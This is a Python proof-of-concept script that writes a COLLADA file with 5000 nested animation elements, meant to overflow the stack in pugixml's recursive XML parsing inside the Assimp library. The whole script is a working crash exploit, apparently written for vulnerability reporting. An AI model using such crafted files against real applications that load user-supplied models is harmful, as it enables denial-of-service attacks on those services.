#!/usr/bin/env python3
"""Generate PoC for Assimp Collada/pugixml XML parsing stack overflow.

Deep nesting of <animation> elements in a COLLADA file causes unbounded
recursion in pugixml's XML parser (strequal at pugixml.cpp:251), which
exhausts the stack before Assimp's own recursion limits can trigger.
"""
import os

OUT = os.path.dirname(os.path.abspath(__file__))


def make_collada_animation_recursion(depth=5000):
    xml = '<?xml version="1.0"?>\n'
    xml += '<COLLADA xmlns="http://www.collada.org/2005/11/COLLADASchema" version="1.4.1">\n'
    xml += '<library_animations>\n'
    for i in range(depth):
        xml += f'<animation id="a{i}">\n'
    xml += '<source id="s"><float_array id="f" count="1">0</float_array></source>\n'
    for i in range(depth):
        xml += '</animation>\n'
    xml += '</library_animations>\n'
    xml += '</COLLADA>\n'

    out_path = os.path.join(OUT, "poc.dae")
    with open(out_path, "wb") as f:
        f.write(xml.encode())
    print(f"Written {len(xml)} bytes to {out_path} (depth={depth})")


if __name__ == "__main__":
    make_collada_animation_recursion(5000)
